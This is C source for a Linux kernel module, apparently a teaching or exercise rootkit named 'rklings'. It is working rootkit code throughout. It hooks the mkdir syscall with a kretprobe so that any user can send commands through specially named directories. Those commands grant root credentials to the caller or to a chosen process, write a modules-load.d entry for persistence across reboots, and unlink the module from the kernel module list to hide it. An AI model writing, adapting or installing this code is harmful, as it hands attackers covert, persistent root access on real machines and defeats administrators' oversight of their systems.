// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/uaccess.h>

#define RK_PREFIX     "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX   128
#define RK_CONF_PATH  "/etc/modules-load.d/rklings.conf"

static unsigned int escalation_count;
static int deferred_pid;
static struct list_head *saved_prev;
static bool module_hidden;

static int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	escalation_count++;
	return commit_creds(new_cred);
}

static int rk_escalate_pid(int pid)
{
	struct task_struct *task;
	struct cred *new_cred;
	const struct cred *old_cred;

	rcu_read_lock();
	task = pid_task(find_vpid(pid), PIDTYPE_PID);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	if (!task->mm) {
		rcu_read_unlock();
		return -EINVAL;
	}
	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred) {
		rcu_read_unlock();
		return -ENOMEM;
	}
	old_cred = (const struct cred *)task->real_cred;
	rcu_assign_pointer(task->real_cred, new_cred);
	rcu_assign_pointer(task->cred, new_cred);
	rcu_read_unlock();
	put_cred(old_cred);
	escalation_count++;
	return 0;
}

static int rk_try_deferred(void)
{
	int ret;

	if (deferred_pid <= 0)
		return 0;
	ret = rk_escalate_pid(deferred_pid);
	if (ret == 0)
		deferred_pid = 0;
	return ret;
}

static int rk_persist(void)
{
	struct file *f;
	loff_t pos = 0;

	f = filp_open(RK_CONF_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(f))
		return PTR_ERR(f);
	kernel_write(f, "rklings\n", 8, &pos);
	filp_close(f, NULL);
	return 0;
}

static int rk_unpersist(void)
{
	struct file *f;
	loff_t pos = 0;

	f = filp_open(RK_CONF_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(f))
		return PTR_ERR(f);
	// Write empty file to clear the entry
	kernel_write(f, "", 0, &pos);
	filp_close(f, NULL);
	return 0;
}

static void rk_module_hide(void)
{
	if (module_hidden)
		return;
	saved_prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = true;
}

static void rk_module_unhide(void)
{
	if (!module_hidden)
		return;
	list_add(&THIS_MODULE->list, saved_prev);
	module_hidden = false;
}

static int rk_cmd_ping(const char *arg)
{
	pr_info("rklings: dispatch: cmd=ping\n");
	return 0;
}

static int rk_cmd_status(const char *arg)
{
	pr_info("rklings: alive, escalations=%u, deferred=%d, hidden=%d\n",
		escalation_count, deferred_pid, module_hidden);
	return 0;
}

static int rk_cmd_escalate(const char *arg)
{
	int pid;
	int ret;

	if (!arg)
		return rk_escalate();

	if (kstrtoint(arg, 10, &pid) != 0 || pid <= 0)
		return -EINVAL;

	ret = rk_escalate_pid(pid);
	if (ret == -ESRCH) {
		deferred_pid = pid;
		return 0;
	}
	return ret;
}

static int rk_dispatch(const char *name)
{
	const char *suffix;
	const char *dot;
	const char *arg;
	int cmd_len;

	suffix = name + RK_PREFIX_LEN;

	dot = strchr(suffix, '.');
	if (dot) {
		cmd_len = dot - suffix;
		arg = dot + 1;
	} else {
		cmd_len = strlen(suffix);
		arg = NULL;
	}

	if (cmd_len == 1 && strncmp(suffix, "e", 1) == 0)
		return rk_cmd_escalate(arg);
	if (cmd_len == 4 && strncmp(suffix, "ping", 4) == 0)
		return rk_cmd_ping(arg);
	if (cmd_len == 6 && strncmp(suffix, "status", 6) == 0)
		return rk_cmd_status(arg);
	if (cmd_len == 7 && strncmp(suffix, "persist", 7) == 0)
		return rk_persist();
	if (cmd_len == 9 && strncmp(suffix, "unpersist", 9) == 0)
		return rk_unpersist();
	if (cmd_len == 1 && strncmp(suffix, "h", 1) == 0 &&
	    arg && strcmp(arg, "m") == 0) {
		rk_module_hide();
		return 0;
	}
	if (cmd_len == 1 && strncmp(suffix, "u", 1) == 0 &&
	    arg && strcmp(arg, "m") == 0) {
		rk_module_unhide();
		return 0;
	}

	return -ENOENT;
}

struct rk_mkdir_data {
	int result;
	bool intercepted;
};

static int rk_mkdir_entry(struct kretprobe_instance *inst,
			  struct pt_regs *regs)
{
	struct rk_mkdir_data *data;
	struct pt_regs *uregs;
	const char __user *pathname;
	char buf[RK_PATH_MAX];
	const char *base;
	long copied;

	data = (struct rk_mkdir_data *)inst->data;
	data->intercepted = false;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;

	pathname = (const char __user *)uregs->di;
	copied = strncpy_from_user(buf, pathname, sizeof(buf));
	if (copied <= 0)
		return 0;

	base = strrchr(buf, '/');
	base = base ? base + 1 : buf;

	if (strncmp(base, RK_PREFIX, RK_PREFIX_LEN) != 0)
		return 0;

	data->result = rk_dispatch(base);
	data->intercepted = true;

	// Nullify the pathname so the real mkdir sees an empty string
	put_user('\0', (char __user *)pathname);
	return 0;
}

static int rk_mkdir_return(struct kretprobe_instance *inst,
			   struct pt_regs *regs)
{
	struct rk_mkdir_data *data;

	data = (struct rk_mkdir_data *)inst->data;
	if (data->intercepted)
		regs_set_return_value(regs, (unsigned long)(long)data->result);
	return 0;
}

static struct kretprobe rk_mkdir_probe = {
	.kp.symbol_name = "__x64_sys_mkdir",
	.entry_handler  = rk_mkdir_entry,
	.handler        = rk_mkdir_return,
	.data_size      = sizeof(struct rk_mkdir_data),
	.maxactive      = 8,
};

static int rk_proc_show(struct seq_file *m, void *v)
{
	rk_try_deferred();
	if (deferred_pid > 0)
		seq_printf(m, "deferred: %d\n", deferred_pid);
	else
		seq_puts(m, "idle\n");
	seq_printf(m, "escalations: %u\n", escalation_count);
	seq_printf(m, "hidden: %s\n", module_hidden ? "yes" : "no");
	return 0;
}

static int __init rk_init(void)
{
	int ret;

	ret = register_kretprobe(&rk_mkdir_probe);
	if (ret)
		return ret;
	proc_create_single("rklings", 0444, NULL, rk_proc_show);
	return 0;
}

static void __exit rk_exit(void)
{
	rk_module_unhide();
	remove_proc_entry("rklings", NULL);
	unregister_kretprobe(&rk_mkdir_probe);
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings persistence and module cloaking");
